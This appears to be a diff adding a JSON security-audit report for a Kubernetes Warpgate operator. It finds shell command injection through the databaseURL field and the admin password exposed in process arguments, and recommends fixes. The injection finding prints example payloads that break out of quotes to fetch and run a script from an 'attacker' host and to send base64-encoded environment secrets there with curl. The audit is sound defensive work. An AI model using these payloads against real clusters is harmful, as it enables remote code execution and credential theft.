@@ -1,0 +1,36 @@
+{
+  "summary": "Reviewed both findings against internal/controller/warpgateinstance_controller.go, api/v1alpha1/warpgateinstance_webhook.go, and warpgateinstance_types.go. Kept both. Finding 1 (OS command injection via spec.databaseURL) is fully confirmed: DatabaseURL is a free-form string with no validation (webhook only emits an informational warning), and it is interpolated unescaped into a shell command executed via /bin/sh -c, allowing command substitution and quote-breakout for arbitrary command execution in the init container. Finding 2 (admin password in process argv) is a confirmed real behavior but low impact: the init container's argv is only observable to an attacker already sharing its PID namespace (not the default) or with prior code execution, so confidence is lowered to low.",
+  "coverage": [
+    "internal/controller/warpgateinstance_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via spec.databaseURL in WarpgateInstance init script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment() assembles an init-container shell script by string-interpolating the CRD field spec.databaseURL directly into a command line, and that script is executed with Command: []string{\"/bin/sh\", \"-c\", initScript} (line 776). The value is placed inside double quotes but is never escaped, so shell metacharacters are honored: command substitution ($(...) / backticks) executes even inside double quotes, and a literal double-quote closes the string to allow arbitrary command chaining. spec.databaseURL is a free-form string field (warpgateinstance_types.go:86) and the WarpgateInstance validating webhook (validateWarpgateInstance) performs no validation on it \u2014 it only emits an informational warning (warpgateinstance_webhook.go:256-258). Anyone who can create or update a WarpgateInstance CR (e.g. a delegated namespace tenant, or a compromised GitOps pipeline value) can achieve arbitrary command execution in the init container, which runs with the warpgate pod's ServiceAccount and has the admin password (ADMIN_PASSWORD env), mounted SSH host/client keys, and TLS private key available \u2014 enabling credential theft and lateral movement. Example: spec.databaseURL = 'sqlite:/data/db\";wget http://attacker/x -O /tmp/x;sh /tmp/x;\"' or '$(curl http://attacker/$(cat /proc/self/environ|base64))'. The same unescaped-interpolation pattern also feeds spec.databaseURL and spec.externalHost into the generated warpgate.yaml (buildWarpgateConfig, lines 345 and 380), which additionally permits YAML config injection.",
+      "evidence": "Line 549-552: setupCmd := fmt.Sprintf(`warpgate ... --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))\nLine 556-558: if inst.Spec.DatabaseURL != \"\" { setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) }\nLine 570: scriptParts = append(..., fmt.Sprintf(\"  %s\", setupCmd))  // joined into initScript\nLine 776: Command: []string{\"/bin/sh\", \"-c\", initScript}\nSource: inst.Spec.DatabaseURL is attacker-controllable CRD input (warpgateinstance_types.go:86, free-form string); webhook validateWarpgateInstance() does not restrict it (only emits an informational warning at warpgateinstance_webhook.go:256-258). Also confirmed unescaped YAML interpolation at buildWarpgateConfig lines 345 (database_url) and 380 (external_host).",
+      "recommendation": "Do not build shell command lines by string interpolation of user-controlled fields. Pass databaseURL (and other variable values) to the warpgate binary via environment variables sourced from the Secret/CR and reference them through the shell's own expansion with proper quoting, or run the setup binary directly with an argv slice (exec form) instead of /bin/sh -c so values are never re-parsed by a shell. If a shell is unavoidable, strictly validate databaseURL against an allowlist (scheme + host/port + db name) in the validating webhook and reject shell metacharacters. Apply the same treatment to externalHost and any other free-form field written into the script or YAML."
+    },
+    {
+      "title": "Warpgate admin password exposed via process arguments in init container",
+      "category": "security",
+      "cwe": "CWE-214",
+      "severity": "low",
+      "confidence": "low",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 549,
+      "line_end": 552,
+      "description": "The admin password is passed to the warpgate binary as the --admin-password command-line argument. Although the value comes from an environment variable (ADMIN_PASSWORD) sourced from a Secret, the shell expands ${ADMIN_PASSWORD} before invoking warpgate, so the cleartext password becomes part of the warpgate process's argv and is visible in the container's process table (ps / /proc/<pid>/cmdline) to any other process sharing that namespace. Impact is limited in practice: Kubernetes pods do not share a PID namespace by default (shareProcessNamespace is false), and init containers run sequentially before the app containers start, so during the init container's brief lifetime there is no co-resident process to observe its argv unless an attacker already has code execution inside that container (e.g. via the command-injection issue above) or the pod explicitly enables PID-namespace sharing / an ephemeral debug container is attached. Confidence lowered from medium to low to reflect these mitigating conditions.",
+      "evidence": "Line 550: `warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"` \u2014 the shell substitutes the secret value, placing it in the warpgate process argv. ADMIN_PASSWORD is injected into the init container from a SecretKeyRef (lines 778-790).",
+      "recommendation": "Prefer a mechanism that keeps the password out of argv: pass it via stdin, a file mounted from the Secret (read by the setup command), or an environment variable the warpgate binary reads directly, rather than as a --admin-password CLI flag. If the CLI flag is the only option, document the exposure and ensure no additional containers share the pod's PID namespace."
+    }
+  ]
+}
